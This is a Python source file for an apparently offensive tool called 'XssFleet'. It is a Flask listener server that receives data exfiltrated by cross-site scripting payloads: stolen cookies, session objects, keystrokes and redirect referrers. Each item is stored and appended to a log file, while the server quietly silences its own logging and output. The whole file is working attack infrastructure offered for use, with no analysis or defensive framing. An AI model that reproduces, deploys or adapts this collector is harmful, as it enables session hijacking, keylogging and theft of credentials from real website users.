"""
XSS Listener Server
Listen and capture sensitive information from target website
"""

from flask import Flask, request, redirect
import json
import threading
import time
import logging
from typing import Dict, List, Optional, Callable
import os


class ListenerServer:
    def __init__(self, port: int = 8080):
        self.app = Flask(__name__)
        self.port = port
        self.server_thread = None
        self.is_running = False
        self.data_store = {
            'cookies': [],
            'sessions': [],
            'keylogs': [],
            'redirects': []
        }
        self.log_file = 'xss_exploit.log'
        self.capture_callback = None
        self.seen_captures = {}  # key -> last_time

        # Disable Flask log output
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)
        log.disabled = True
        self.app.logger.disabled = True

        # Register routes
        self._register_routes()

    def set_capture_callback(self, callback: Callable):
        """Set callback function for when data is captured"""
        self.capture_callback = callback

    def _notify_capture(self, data_type: str, data: Dict):
        """Notify that data has been captured"""
        if self.capture_callback:
            self.capture_callback(data_type, data)
        else:
            self._print_capture_notification(data_type, data)

    def _print_capture_notification(self, data_type: str, data: Dict):
        """Print concise capture notification"""
        timestamp = data.get('timestamp', time.strftime('%H:%M:%S'))
        ip = data.get('ip', 'unknown')

        if data_type == 'cookies':
            cookie_preview = data.get('data', '')[:50]
            print(f"\n[+] [{timestamp}] Cookie Captured | IP: {ip}")
            print(f"    {cookie_preview}...")

        elif data_type == 'sessions':
            print(f"\n[+] [{timestamp}] Session Captured | IP: {ip}")
            print(f"    Data recorded")

        elif data_type == 'keylogs':
            key_preview = data.get('data', '')[:30]
            print(f"\n[+] [{timestamp}] Keystroke Captured | IP: {ip}")
            print(f"    {key_preview}...")

        elif data_type == 'redirects':
            print(f"\n[+] [{timestamp}] Redirect Captured | IP: {ip}")
            print(f"    Source: {data.get('data', {}).get('referrer', 'unknown')}")

        print()

    def _register_routes(self):
        @self.app.route('/cookie')
        def capture_cookie():
            cookie = request.args.get('c', '')
            if cookie:
                capture_key = f"cookie:{cookie[:50]}"
                now = time.time()
                last_time = self.seen_captures.get(capture_key, 0)
                should_notify = (now - last_time > 5)
                if should_notify:
                    self.seen_captures[capture_key] = now
                
                data = {
                    'type': 'cookie',
                    'data': cookie,
                    'ip': request.remote_addr,
                    'user_agent': request.user_agent.string,
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                }
                self.data_store['cookies'].append(data)
                self._log_data(data)
                if should_notify:
                    self._notify_capture('cookies', data)
            return 'OK'

        @self.app.route('/session', methods=['POST'])
        def capture_session():
            try:
                data = request.get_json()
                if data:
                    capture_key = f"session:{str(data)[:50]}"
                    now = time.time()
                    last_time = self.seen_captures.get(capture_key, 0)
                    should_notify = (now - last_time > 5)
                    if should_notify:
                        self.seen_captures[capture_key] = now
                    
                    session_data = {
                        'type': 'session',
                        'data': data,
                        'ip': request.remote_addr,
                        'user_agent': request.user_agent.string,
                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                    }
                    self.data_store['sessions'].append(session_data)
                    self._log_data(session_data)
                    if should_notify:
                        self._notify_capture('sessions', session_data)
            except:
                pass
            return 'OK'

        @self.app.route('/keylog')
        def capture_keylog():
            key_data = request.args.get('d', '') or request.args.get('k', '')
            if key_data:
                capture_key = f"keylog:{key_data[:30]}"
                now = time.time()
                last_time = self.seen_captures.get(capture_key, 0)
                should_notify = (now - last_time > 5)
                if should_notify:
                    self.seen_captures[capture_key] = now
                
                keylog_data = {
                    'type': 'keylog',
                    'data': key_data,
                    'ip': request.remote_addr,
                    'user_agent': request.user_agent.string,
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                }
                self.data_store['keylogs'].append(keylog_data)
                self._log_data(keylog_data)
                if should_notify:
                    self._notify_capture('keylogs', keylog_data)
            return 'OK'

        @self.app.route('/redirect')
        def capture_redirect():
            redirect_data = {
                'type': 'redirect',
                'data': {
                    'referrer': request.referrer,
                    'url': request.url
                },
                'ip': request.remote_addr,
                'user_agent': request.user_agent.string,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }
            capture_key = f"redirect:{request.remote_addr}"
            now = time.time()
            last_time = self.seen_captures.get(capture_key, 0)
            should_notify = (now - last_time > 5)
            if should_notify:
                self.seen_captures[capture_key] = now
            
            self.data_store['redirects'].append(redirect_data)
            self._log_data(redirect_data)
            if should_notify:
                self._notify_capture('redirects', redirect_data)
            return redirect('https://example.com')

        @self.app.route('/')
        def index():
            return 'XssFleet Listener Server'

    def _log_data(self, data: Dict):
        """Log captured data to file"""
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(json.dumps(data, ensure_ascii=False) + '\n')

    def start(self):
        """Start listener server"""
        if self.is_running:
            return

        self.is_running = True

        import sys
        old_stdout = sys.stdout
        sys.stdout = open(os.devnull, 'w')

        self.server_thread = threading.Thread(
            target=self._run_server
        )
        self.server_thread.daemon = True
        self.server_thread.start()

        time.sleep(1)
        sys.stdout = old_stdout

    def _run_server(self):
        """Run server"""
        import sys
        old_stderr = sys.stderr
        sys.stderr = open(os.devnull, 'w')
        self.app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        sys.stderr = old_stderr

    def stop(self):
        """Stop listener server"""
        self.is_running = False
        if self.server_thread:
            self.server_thread.join(timeout=1)

    def get_data(self, data_type: str = None) -> List[Dict]:
        """Get captured data"""
        if data_type:
            return self.data_store.get(data_type, [])
        return self.data_store

    def clear_data(self):
        """Clear all captured data"""
        self.data_store = {
            'cookies': [],
            'sessions': [],
            'keylogs': [],
            'redirects': []
        }

    def is_server_running(self) -> bool:
        """Check if server is running"""
        return self.is_running
